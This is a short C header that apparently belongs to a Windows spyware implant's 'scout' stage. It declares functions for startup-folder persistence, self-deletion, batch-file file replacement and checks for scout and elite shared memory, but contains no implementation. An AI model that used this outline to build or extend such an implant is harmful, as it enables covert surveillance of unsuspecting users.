#ifndef _MAIN_H
#define _MAIN_H

#include "binpatched_vars.h"

#define SCOUT_VERSION 8
#define SHARED_MEMORY_WRITE_SIZE 4096

VOID MySleep(ULONG uTime);
VOID WaitForInput();
VOID UseLess();
VOID DeleteAndDie(BOOL uDie);
VOID Drop();
VOID DoCopyFile(PWCHAR pSource, PWCHAR pDest);
PCHAR GetScoutSharedMemoryName();
PCHAR GetEliteSharedMemoryName();
LPWSTR CreateTempFile();
BOOL CreateScoutSharedMemory();
BOOL ExistsScoutSharedMemory();
BOOL ExistsEliteSharedMemory();
BOOL AmIFromStartup();
BOOL StartBatch(PWCHAR pName);
VOID CreateCopyBatch(PWCHAR pSource, PWCHAR pDest, PWCHAR *pBatchOutName);
VOID CreateDeleteBatch(PWCHAR pFileName, PWCHAR *pBatchOutName);
VOID CreateReplaceBatch(PWCHAR pOldFile, PWCHAR pNewFile, PWCHAR *pBatchOutName);
HRESULT ComCopyFile(__in LPWSTR strSourceFile, __in LPWSTR strDestDir, __in_opt LPWSTR strNewName);

PWCHAR GetStartupPath();
PWCHAR GetStartupScoutName();
PWCHAR GetMySelfName();
PWCHAR GetTemp();


#endif